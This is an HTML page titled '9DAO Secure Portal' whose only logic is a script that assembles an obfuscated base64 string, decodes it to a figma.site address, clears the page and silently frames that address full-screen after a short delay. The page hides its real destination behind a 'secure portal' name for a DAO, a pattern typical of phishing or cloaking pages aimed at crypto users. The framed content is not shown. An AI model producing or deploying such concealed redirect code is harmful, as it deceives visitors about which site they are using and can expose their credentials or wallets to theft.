<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>9DAO Secure Portal</title>
  <style>
    body { margin: 0; padding: 0; overflow: hidden; background: #000; }
    #loader { 
      position: fixed; 
      top: 0; left: 0; 
      width: 100%; height: 100%; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      color: #0f0; 
      font-family: monospace;
      z-index: 1000;
    }
  </style>
</head>
<body>


  <script>
   
    (function(){
  
      const part1 = "aHR0cHM6Ly9z";
      const part2 = "aGVkLXdyYXA";
      const part3 = "tMTA4NzAwMjYuZmlnbWEuc2l0ZS8";
      

      function decrypt() {
        try {
          
          const url = atob(part1 + part2 + part3);
          
     
          if(!url.includes('figma.site')) return;
          
       
          const iframe = document.createElement('iframe');
          iframe.src = url;
          iframe.style = 'width:100%;height:100vh;border:none';
          iframe.allowFullscreen = true;
          
         
          document.body.innerHTML = '';
          document.body.appendChild(iframe);
          
        } catch(e) {
          document.getElementById('loader').textContent = 'System error';
        }
      }

      // 3. Tự động chạy
      setTimeout(decrypt, 800);
    })();
  </script>
</body>
</html>
